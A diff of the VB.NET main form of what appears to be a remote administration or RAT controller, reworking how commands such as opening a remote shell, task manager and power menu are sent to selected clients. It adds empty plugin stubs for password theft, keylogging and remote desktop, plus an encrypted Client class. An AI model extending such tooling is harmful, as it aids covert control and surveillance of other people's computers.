     Private Sub TaskmanButton_Click(sender As Object, e As EventArgs) Handles TaskmanButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.opentaskman)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.opentaskman)
         Next
     End Sub
 
     Private Sub RetrieveButton_Click(sender As Object, e As EventArgs)
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.getspecs)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.getspecs)
         Next
     End Sub
 
@@ -896,19 +899,19 @@ Public Class Main
 
     Private Sub ReconnectButton_Click(sender As Object, e As EventArgs) Handles ReconnectButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.reconnect)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.reconnect)
         Next
     End Sub
 
     Private Sub ShellButton_Click(sender As Object, e As EventArgs) Handles ShellButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openshell)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openshell)
         Next
     End Sub
 
     Private Sub PowerButton_Click(sender As Object, e As EventArgs) Handles PowerButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openpower)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openpower)
         Next
     End Sub
 #End Region
@@ -1069,6 +1072,11 @@ Public Class Main
     End Sub
 #End Region
 
+    ''' <summary>
+    ''' Copy host information to clipboard (formatted)
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
     Private Sub CopyToClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToClipboardToolStripMenuItem.Click
         Dim ars As Integer = 0
         For Each x As ListViewItem In L1.SelectedItems
@@ -1098,7 +1106,18 @@ Public Class Main
 
     Private Sub PluginListView_DoubleClick(sender As Object, e As EventArgs) Handles PluginListView.DoubleClick
         For Each x As ListViewItem In PluginListView.SelectedItems
+            Select Case x.ImageIndex
+                Case 0 ''passwords
 
+                Case 1 ''keylogger
+
+                Case 2 ''remote desktop
+
+                Case 3 ''lock
+                    ''TODO
+                Case Else
+                    ''TODO: More plugins
+            End Select
         Next
     End Sub
 
@@ -1107,6 +1126,26 @@ Public Class Main
             PluginListView_DoubleClick(sender, e)
         End If
     End Sub
+End Class
 
-
+''' <summary>
+''' Client class
+''' </summary>
+Public Class Client
+    Public ID As String
+    Public Key As String
+    Public Socket As Integer
+    Public Cryptor As Crypt.Aes256Base64Encrypter
+    Public Trusted As Boolean
+    Public Sub New(
+              ByVal m_ID As String,
+              ByVal m_Socket As Integer,
+              ByVal m_Key As String,
+              ByVal m_Trusted As Boolean)
+        ID = m_ID
+        Socket = m_Socket
+        Key = m_Key
+        Cryptor = New Crypt.Aes256Base64Encrypter(m_Key)
+        Trusted = m_Trusted
+    End Sub
 End Class
